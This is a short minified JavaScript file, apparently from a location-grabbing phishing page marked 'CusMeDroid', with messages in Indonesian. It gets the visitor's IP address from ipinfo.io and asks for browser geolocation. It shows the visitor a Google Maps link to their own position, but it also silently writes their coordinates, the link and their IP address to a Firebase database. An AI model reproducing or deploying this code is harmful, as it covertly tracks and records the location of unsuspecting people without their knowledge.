/* Powered by CusMeDroid */
var msk=new Date;let time=msk.getTime();var mVoLay=document.getElementById("culoerap"),mVoBrow=document.getElementById("vbrow"),output=document.getElementById("output"),xip="";function getLoc(){""==xip?alert("Maaf ada yang salah"):navigator.geolocation?navigator.geolocation.getCurrentPosition(showPosition):alert("Pastikan anda mengizinkan akses lokasi.")}function showPosition(o){output.innerHTML="Lokasi saya saat ini.<br>https://google.com/maps/search/"+o.coords.latitude+","+o.coords.longitude;var t=o.coords.latitude,e=o.coords.longitude,a="https://google.com/maps/search/"+t+","+e;firebase.database().ref("MeTextAI/"+time).set({Latitude:t,Longitude:e,Maps:a,IpAddress:xip}),mVoLay.style.display="none",mVoBrow.style.display="block"}function lClose(){mVoLay.style.display="block",mVoBrow.style.display="none"}$.get("https://ipinfo.io",(function(o){xip=o.ip}),"json");
